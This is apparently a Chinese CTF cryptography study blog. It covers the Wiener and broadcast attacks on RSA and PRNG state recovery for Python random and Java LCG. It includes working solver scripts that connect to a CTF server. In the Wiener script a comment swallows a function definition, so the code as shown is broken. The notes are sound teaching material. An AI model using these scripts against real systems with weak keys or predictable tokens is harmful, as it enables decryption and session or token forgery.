<h4 id="例子">例子</h4>
<p>设公钥(N,e)=(90581,17993)。</p>
<p>先求<span class="math inline">\(\frac{e}{n}\)</span>的渐进分数。
<span class="math display">\[
\frac{e}{n}=\frac{17993}{90581}
\\=\frac{1}{\frac{90581}{17993}}=\frac{1}{5+\frac{616}{17993}}
\\=\frac{1}{5+\frac{1}{\frac{17993}{616}}}=\frac{1}{5+\frac{1}{29+\frac{129}{616}}}...
\]</span></p>
<p>故有<span
class="math inline">\(\frac{k}{d}=0,\frac{1}{5},\frac{29}{146}...\)</span></p>
<p>假设<span class="math inline">\(\frac{29}{146}\)</span>成立，则<span
class="math inline">\(k=29\)</span>，<span
class="math inline">\(d=146\)</span>，代入<span
class="math inline">\(ed-1=k\varphi(n)\)</span>，得出<span
class="math inline">\(\varphi(n)\)</span>的值，又因<span
class="math inline">\(\varphi(n)=n-(p+q)+1\)</span>，故得到p+q和pq的值。</p>
<p>由韦达定理可解。</p>
<h4 id="例题-4">例题</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n = 12238605063252292170613110607692779326628090745751955692266649177882959231822580682548279800443278979485092243645806337103841086023159482786712759291169541633901936290854044069486201989034158882661270017305064348254800318759062921744741432214818915527537124001063995865927527037625277330117588414586505635959411443039463168463608235165929831344586283875119363703480280602514451713723663297066810128769907278246434745483846869482536367912810637275405943566734099622063142293421936734750356828712268385319217225803602442033960930413469179550331907541244416573641309943913383658451409219852933526106735587605884499707827</span><br><span class="line">e = 11850552481503020257392808424743510851763548184936536180317707155841959788151862976445957810691568475609821000653594584717037528429828330763571556164988619635320288125983463358648887090031957900011546300841211712664477474767941406651977784177969001025954167441377912326806132232375497798238928464025466905201977180541053129691501120197010080001677260814313906843670652972019631997467352264392296894192998971542816081534808106792758008676039929763345402657578681818891775091140555977382868531202964486261123748663752490909455324860302967636149379567988941803701512680099398021640317868259975961261408500449965277690517</span><br><span class="line">c = 9472193174575536616954091686751964873836697237500198884451530469300324470671555310791335185133679697207007374620225900775502162690848135615431624557389304657410880981454777737587420426091879654002644281066474715074536611611252677882396384453641127487515845176069574754606670518031472235144795376526854484442135299818868525539923568705203042265537204111153151119105287648912908771710419648445826883069030285651763726003413418764301988228077415599665616637501056116290476861280240577145515875430665394216054222788697052979429015400411487342877096677666406389711074591330476335174211990429870900468249946600544116793793</span><br></pre></td></tr></table></figure>
<p>求解。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def transform(x,y):       #使用辗转相处将分数 x/y 转为连分数的形式</span><br><span class="line">    res=[]</span><br><span class="line">    while y:</span><br><span class="line">        res.append(x//y)</span><br><span class="line">        x,y=y,x%y</span><br><span class="line">    return res</span><br><span class="line">    </span><br><span class="line">def continued_fraction(sub_res):</span><br><span class="line">    numerator,denominator=1,0</span><br><span class="line">    for i in sub_res[::-1]:      #从sublist的后面往前循环</span><br><span class="line">        denominator,numerator=numerator,i*numerator+denominator</span><br><span class="line">    return denominator,numerator   #得到渐进分数的分母和分子，并返回</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#求解每个渐进分数def sub_fraction(x,y):</span><br><span class="line">    res=transform(x,y)</span><br><span class="line">    res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res)))))  #将连分数的结果逐一截取以求渐进分数</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">#以上是获得e/n的连分数</span><br><span class="line"></span><br><span class="line">def get_pq(a,b,c):      #由p+q和pq的值通过维达定理来求解p和q</span><br><span class="line">    par=gmpy2.isqrt(b*b-4*a*c)   #由上述可得，开根号一定是整数，因为有解</span><br><span class="line">    x1,x2=(-b+par)//(2*a),(-b-par)//(2*a)</span><br><span class="line">    return x1,x2</span><br><span class="line"></span><br><span class="line">def wienerAttack(e,n):</span><br><span class="line">    for (d,k) in sub_fraction(e,n):  #用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span><br><span class="line">        if k==0:                     #可能会出现连分数的第一个为0的情况，排除</span><br><span class="line">            continue</span><br><span class="line">        if (e*d-1)%k!=0:             #ed=1 (\pmod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span><br><span class="line">            continue</span><br><span class="line">        </span><br><span class="line">        phi=(e*d-1)//k               #这个结果就是 φ(n)</span><br><span class="line">        px,qy=get_pq(1,n-phi+1,n)</span><br><span class="line">        if px*qy==n:</span><br><span class="line">            p,q=abs(int(px)),abs(int(qy))     #可能会得到两个负数，负负得正未尝不会出现</span><br><span class="line">            d=gmpy2.invert(e,(p-1)*(q-1))     #求ed=1 (\pmod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span><br><span class="line">            return d</span><br><span class="line">    print(&quot;该方法不适用&quot;)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">e = 14058695417015334071588010346586749790539913287499707802938898719199384604316115908373997739604466972535533733290829894940306314501336291780396644520926473</span><br><span class="line">n = 33608051123287760315508423639768587307044110783252538766412788814888567164438282747809126528707329215122915093543085008547092423658991866313471837522758159</span><br><span class="line">d = wienerAttack(e,n)</span><br><span class="line">print(&quot;d=&quot;,d)</span><br></pre></td></tr></table></figure>
<h3 id="广播攻击">广播攻击</h3>
<p>如果相同的信息被不同的公钥加密的了，并且如果使用的<span
class="math inline">\(e\)</span>较小，就可以进行广播攻击。</p>
<p>准确的条件：$m.bit_length*e &lt; c.bit_length $。</p>
<p><span class="math inline">\(m\)</span>和<span
class="math inline">\(e\)</span>相同，由于不同的<span
class="math inline">\(n\)</span>计算出不同的<span
class="math inline">\(c\)</span>，故有： <span class="math display">\[
c_1=m^e\,mod\,n_1
\\
c_2=m^e\,mod\,n_2
\\
c_3=m^e\,mod\,n_3
\\\cdot\cdot\cdot\\
c_n=m^e\,mod\,n_n
\]</span> 在<span
class="math inline">\(n_i\)</span>互素时，通过中国剩余定理，得到<span
class="math inline">\(c \equiv m^e \pmod {n_1n_2n_3\cdot\cdot\cdot
n_n}\)</span>。</p>
<p>若不互素，可通过欧几里得算法求解<span
class="math inline">\(pq\)</span>。</p>
<p>当<span class="math inline">\(c &lt; n_1n_2n_3\cdot\cdot\cdot
n_n\)</span>时，上面等式成立，故此时开e次方即可得解。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install libgmp-dev</span><br><span class="line">sudo apt install libmpfr-dev</span><br><span class="line">sudo apt install libmpc-dev</span><br><span class="line">pip install sympy gmpy2</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import iroot</span><br><span class="line">from sympy.ntheory.modular import crt</span><br><span class="line"></span><br><span class="line">e = 9</span><br><span class="line">N = [142782424368849674771976671955176187834932417027468006479038058385550042422280158726561712259205616626939123504489410624745195777853423961104590708231562726165590769610040722589287393102301338152085670464005026301781192671834390892019478189768725018303217559795377795540494239283891894830166363576205812991157,153610425077816156109768509904751446801233412970601397035720458311275245730833227428213917577405780162151444202393431444812010569489900435979730559895340377469612234558042643742219128033827948585534761030527275423811282367831985007507137144308704413007806012914286105842311420933479771294576841956749281552971,152540067782701001222493009941492423063369171831039847414320547494725020441901272486665728360741395415762864872737675660423920609681185809510355937534756399208661762715484879562585724584849261266873624875852300611683382543315580370484972470694466195837255994159609193239840228218925381488410059939975556977947,125842716702134814646356078531900645012495638692517778270527426844383063904041812273637776798591687732598509470005151551320457132061693618473039437320011446697406190781306264437609046721508738109650829547010385875425097336266103994639126319889016342284747700714199556143378526590058467791687837422897022829661,116144389285266462769913139639175922392318396923181100785008570884082681963637784423143843845816350379438789947802939701820129805341796427821894273985551331666719808355412080909245720551238149511778060242720419584504473490216670437024863860559347959698828131475160058721701582089480924088773887932997353631767,127833907448946785858374094953899556339175475846831397383049660262333005992005484987913355932559627279178940862787593749842796469355336182379062826441222705075178971785791223706944120681105575965622931327112817747065200324610697178273898956820957640413744954233327851461318200323486469677469950386824833536523,130561613227079478921314550968562766645507834694262831586725464124109153306162445639759476845681271537955934718244296904503168256991962908095007040044300188572466395275317838178325500238288302672390013747102961340256309124310478931896245221622317302428447389760864327859640573452084295225059466376349115703119,115953389401040751013569404909249958538962411171147823610874077094621794755967854844224923689925397631692572916641171075740839099217316101334941033937183815345038898177087515909675028366437302462022970987947264115373697445950951595479758872029099661065186221250394358255523574834723958546450323357472451930993,143437107845384843564651522639125300763388830136500260725097766445883003928355325003575359566631064630487365774344508496878731109174874449170057678821440711511966073934025028100604234445470976333825866939923998344367645612128590820812489407412175198698290167077116185959180877334222693344630253253476594907313]</span><br><span class="line">C = [85033868418784308573673709960700777350314426427677627319697346811123742342359072170220428874952996988431950989321281905284522596263957356289624365171732095210045916218066135140320107686084053271623461104022705353814233772164502775939590711842361956121603943483040254727995655776263673058788416722141673409688,66065963470666895005407449599703926269325406456711861190876894466341571726360462706664546294453572319565476664348345756905411939632955966517708138047546806602828064213238537646393524578984547577761559965654539771172357089802682793169968961304179886652390277814477825753096636750388350662980872556701402397564,116011740820520887443111656288411611070614127688662643257265381793048354928820176624229624692124188995846076431510548507016903260774215950803926107831505634778278712070141663189086436127990584944132764896694777031370995058271038329228336417590284517922855284619653301817355115583540545182119702335431334401666,97640420284096094887471273365295984332267897927392169402918423863919914002451127544715668846623138003564829254309568918651163254043205129883843425179687841236818720463784828905460885026290909768599562386370732119591181513319548915478512030197629196018254041500662654260834562708620760373487652389789200792120,8112507653841374573057048967617108909055624101437903775740427861003476480616929517639719198652146909660899632120639789106782550275648578142883715280547602249589837441805676364041484345030575130408744621981440093280624046635769338568542048839419939250444929802135605724150484414516536378791500915047844188300,36792148360808115566234645242678223867680969786675055638670907933041180936164293809961667801099516457636164692292891528415720085345494773373966277807505798679784807614784581861287048096977968620964436947452527540958289441390882589051225367658014709290392321808926567572528170531844664734909469690750971883323,53043093283305492238903255767698153246673671181809989362223466090875767705978690531154079519999671834688647277179370374802495005937892824566602423646978168777735383632928274082669949750078161820002768640908750005814934158829006019656592134357897586040866207754535586785064545866404380204728594863102313407789,88499407133762624445946519155722583633934260410706930537441122463087556094734626189377091740335667052378955691250910459790202385799502439716173363179773811920751410726795431402796346647688144853156900427797933862087074385441977254140336390678022955770879265490567987868532251217565094093318626424653599450992,138337520305048557335599940473834485492131424901034295018189264168040969172072024612859307499682986987325414798210700710891033749119834960687318156171051379643844580970963540418974136891389303624057726575516576726845229494107327508855516437230240365759885913142671816868762838801720492804671259709458388192984]</span><br><span class="line"></span><br><span class="line">resultant, mod = crt(N, C)</span><br><span class="line">value, is_perfect = iroot(resultant, e)</span><br><span class="line">print(long_to_bytes(value))</span><br></pre></td></tr></table></figure>
<h1 id="背包">背包</h1>
<h1 id="椭圆曲线">椭圆曲线</h1>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学 从入门到放弃 序列密码</title>
    <url>/Study-Cipher-Stream/</url>
    <content><![CDATA[<p><strong>XMan
Day2</strong>，整理一下<strong>bibi</strong>师傅的笔记。</p>
<p>序列密码部分。</p>
<p>序列密码又称流密码，是使用一个随时间变化的加密变换，一次加密一个明文的独立符号单位。</p>
<span id="more"></span>
<h3 id="随机数">随机数</h3>
<p>不存在真正的随机数。</p>
<h3 id="伪随机数发生器特性">伪随机数发生器特性</h3>
<p>相同的种子产生的随机数相同，其种子多是来源于时间和噪音。</p>
<h3 id="brute-seed">Brute Seed</h3>
<h4 id="例题">例题</h4>
<p><strong>Jarvis OJ</strong>的一题<strong>babyrpd</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Unbuffered</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream</span>):</span><br><span class="line">        self.stream = stream</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">self, data</span>):</span><br><span class="line">        self.stream.write(data)</span><br><span class="line">        self.stream.flush()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, attr</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(self.stream, attr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.stdout = Unbuffered(sys.stdout)</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line">signal.alarm(<span class="number">600</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/root/level0/flag&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">random.seed(<span class="built_in">int</span>(time.time()))</span><br><span class="line">           </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    recv = <span class="built_in">int</span>(raw_input())</span><br><span class="line">    <span class="keyword">if</span> recv == random.randint(<span class="number">0</span>, <span class="number">2</span> ** <span class="number">64</span>):</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;atum tql&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> check():</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>根据上述条件，种子相同的随机数生成器生成的随机数一样的，因此只需要爆破时间就好了。</p>
<p>要注意的是此处在对比<strong>recv()</strong>和<strong>random.randint()</strong>函数的值的时候，每比较一次，需多生成一次随机数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">target = (<span class="string">&quot;47.97.215.88&quot;</span>, <span class="number">20000</span>)</span><br><span class="line"></span><br><span class="line">io = zio(target)</span><br><span class="line">io.interact()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getstream</span>(<span class="params">times</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times - <span class="number">1</span>):</span><br><span class="line">        random.randint(<span class="number">0</span>, <span class="number">2</span> ** <span class="number">64</span>)</span><br><span class="line">    <span class="keyword">return</span> random.randint(<span class="number">0</span>, <span class="number">2</span> ** <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">times = <span class="number">0</span></span><br><span class="line">now = <span class="built_in">int</span>(time.time()) + <span class="number">10</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    now -= <span class="number">1</span></span><br><span class="line">    times += <span class="number">1</span></span><br><span class="line">    seed = random.seed(now)</span><br><span class="line">    io.writeline(<span class="built_in">str</span>(getstream(times)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;atum&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> io.readline():</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="linear-congruential-prng">Linear Congruential PRNG</h3>
<p><strong>Java</strong>中的<strong>java.util.Random</strong>，<strong>C</strong>中的<strong>rand()</strong>，<strong>PHP</strong>中的<strong>rand()</strong>都有着相似的特性，使用一个<strong>48</strong>位的种子，被同一个线性同余公式生成，若使用的初始种子一样，则生成返回的随机序列一样，公式和初始值如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">next_state = (state * multiplier + addend) mod (2 ^ precision) </span><br><span class="line">multiplier = 25214903917</span><br><span class="line">addend = 11 </span><br><span class="line">Precision = 48</span><br></pre></td></tr></table></figure>
<p>从中摘抄了部分<strong>java.util.Random</strong>的实现代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Random</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3905348978240129619L</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AtomicLong seed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">multiplier</span> <span class="operator">=</span> <span class="number">0x5DEECE66DL</span>; <span class="comment">// 25214903917</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">addend</span> <span class="operator">=</span> <span class="number">0xBL</span>; <span class="comment">// 11</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">mask</span> <span class="operator">=</span> (<span class="number">1L</span> &lt;&lt; <span class="number">48</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">DOUBLE_UNIT</span> <span class="operator">=</span> <span class="number">0x1.0p-53</span>; <span class="comment">// 1.0 / (1L &lt;&lt; 53)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">AtomicLong</span> <span class="variable">seedUniquifier</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicLong</span>(<span class="number">8682522807148012L</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Random</span><span class="params">(<span class="type">long</span> seed)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (getClass() == Random.class)</span><br><span class="line">            <span class="built_in">this</span>.seed = <span class="keyword">new</span> <span class="title class_">AtomicLong</span>(initialScramble(seed));</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// subclass might have overriden setSeed</span></span><br><span class="line">            <span class="built_in">this</span>.seed = <span class="keyword">new</span> <span class="title class_">AtomicLong</span>();</span><br><span class="line">            setSeed(seed);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">initialScramble</span><span class="params">(<span class="type">long</span> seed)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (seed ^ multiplier) &amp; mask;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">nextInt</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> next(<span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">next</span><span class="params">(<span class="type">int</span> bits)</span> &#123;</span><br><span class="line">        <span class="type">long</span> oldseed, nextseed;</span><br><span class="line">        <span class="type">AtomicLong</span> <span class="variable">seed</span> <span class="operator">=</span> <span class="built_in">this</span>.seed;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            oldseed = seed.get();</span><br><span class="line">            nextseed = (oldseed * multiplier + addend) &amp; mask;</span><br><span class="line">        &#125; <span class="keyword">while</span> (!seed.compareAndSet(oldseed, nextseed));</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)(nextseed &gt;&gt;&gt; (<span class="number">48</span> - bits));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处截取的是有参的<strong>Random(long
seed)</strong>构造函数，可以看到的是当<strong>seed</strong>一致的时候，返回生成的序列值也都一样。</p>
<h4 id="例题-1">例题</h4>
<p><strong>Jarvis OJ</strong>的一题<strong>mediumrpd</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Unbuffered</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream</span>):</span><br><span class="line">       self.stream = stream</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">self, data</span>):</span><br><span class="line">       self.stream.write(data)</span><br><span class="line">       self.stream.flush()</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, attr</span>):</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">getattr</span>(self.stream, attr)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.stdout = Unbuffered(sys.stdout)</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line">signal.alarm(<span class="number">600</span>)</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.chdir(<span class="string">&quot;/root/level1&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">o = subprocess.check_output([<span class="string">&quot;java&quot;</span>, <span class="string">&quot;Main&quot;</span>])</span><br><span class="line">tmp=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> o.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>:<span class="number">3</span>]:</span><br><span class="line">    tmp.append(<span class="built_in">int</span>(i.strip()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v1=tmp[<span class="number">0</span>] % <span class="number">0xffffffff</span></span><br><span class="line">v2=tmp[<span class="number">1</span>] % <span class="number">0xffffffff</span></span><br><span class="line">v3=tmp[<span class="number">2</span>] % <span class="number">0xffffffff</span></span><br><span class="line"><span class="built_in">print</span> v1</span><br><span class="line"><span class="built_in">print</span> v2</span><br><span class="line">v3_get=<span class="built_in">int</span>(raw_input())</span><br><span class="line"><span class="keyword">if</span> v3_get==v3:</span><br><span class="line">    <span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>
<p>还有一个被调用的<strong>Java</strong>代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		<span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">		System.out.println(random.nextInt());</span><br><span class="line">		System.out.println(random.nextInt());</span><br><span class="line">		System.out.println(random.nextInt());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据上面截取的部分<strong>Random()</strong>函数的实现代码，<strong>48</strong>位的<strong>nextseed</strong>最后进行了一个<strong>&gt;&gt;&gt;</strong>的无符号右移<strong>16</strong>位，因此我们最后已知的只有<strong>32</strong>位，但可以通过爆破被销毁的<strong>16</strong>位即<strong>math.pow(2,16)</strong>来求解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"><span class="type">long</span> <span class="variable">v1</span> <span class="operator">=</span> random.nextInt();</span><br><span class="line"><span class="type">long</span> <span class="variable">v2</span> <span class="operator">=</span> random.nextInt();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">65536</span>; i++) &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">state</span> <span class="operator">=</span> v1 * <span class="number">65536</span> + i;</span><br><span class="line">    <span class="keyword">if</span> (((state * multiplier + addend) &amp; mask) &gt;&gt;&gt; <span class="number">16</span>) ==v2)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Seed found: &quot;</span> + state);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>故<strong>Exp</strong>如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">target=(<span class="string">&quot;47.97.215.88&quot;</span>,<span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line">io=zio(target)</span><br><span class="line"></span><br><span class="line">v1=<span class="built_in">int</span>(io.readline().strip())</span><br><span class="line">v2=<span class="built_in">int</span>(io.readline().strip())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">liner</span>(<span class="params">seed</span>):</span><br><span class="line">    <span class="keyword">return</span> ((seed*<span class="number">25214903917</span>+<span class="number">11</span>) &amp; <span class="number">0xffffffffffff</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffff</span>+<span class="number">1</span>):</span><br><span class="line">    seed=v1*<span class="number">65536</span>+i</span><br><span class="line">    <span class="keyword">if</span>  liner(seed)&gt;&gt;<span class="number">16</span> == v2:</span><br><span class="line">        <span class="built_in">print</span> seed</span><br><span class="line">        <span class="built_in">print</span> liner(liner(seed))&gt;&gt;<span class="number">16</span></span><br><span class="line">        io.writeline(<span class="built_in">str</span>(liner(liner(seed))&gt;&gt;<span class="number">16</span>))</span><br><span class="line">        <span class="built_in">print</span> io.readline()</span><br></pre></td></tr></table></figure>
<h3 id="mersenne-twister">Mersenne Twister</h3>
<p><strong>Ruby</strong>的<strong>rand()</strong>，<strong>Python</strong>的<strong>random</strong>，<strong>PHP</strong>的<strong>mt_rand()</strong>也有着相似的特性。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s1 = *BG(next)++;</span><br><span class="line">s1 ^= (s1 &gt;&gt; <span class="number">11</span>);</span><br><span class="line">s1 ^= (s1 &lt;&lt;  <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>U;</span><br><span class="line">s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>U;</span><br><span class="line"><span class="keyword">return</span> ( s1 ^ (s1 &gt;&gt; <span class="number">18</span>) );</span><br></pre></td></tr></table></figure>
<p>截取了通过上一位随机数生成下一位随机数的算法。</p>
<p>首先，在<strong>/ext/standard/basic_functions.h</strong>中定义如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MT_N (624)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ZTS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BG(v) ZEND_TSRMG(basic_globals_id, php_basic_globals *, v)</span></span><br><span class="line">PHPAPI <span class="keyword">extern</span> <span class="type">int</span> basic_globals_id;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BG(v) (basic_globals.v)</span></span><br><span class="line">PHPAPI <span class="keyword">extern</span> php_basic_globals basic_globals;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>以及在<strong>/Zend/zend.h</strong>中定义如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ZEND_ENABLE_STATIC_TSRMLS_CACHE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_TSRMG TSRMG_STATIC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_TSRMLS_CACHE_EXTERN() TSRMLS_CACHE_EXTERN()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_TSRMLS_CACHE_DEFINE() TSRMLS_CACHE_DEFINE()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_TSRMLS_CACHE_UPDATE() TSRMLS_CACHE_UPDATE()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_TSRMLS_CACHE TSRMLS_CACHE</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_TSRMG TSRMG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_TSRMLS_CACHE_EXTERN()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_TSRMLS_CACHE_DEFINE()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_TSRMLS_CACHE_UPDATE()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_TSRMLS_CACHE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>还有在<strong>/TSRM/TSRM.h</strong>中有如下定义。</p>
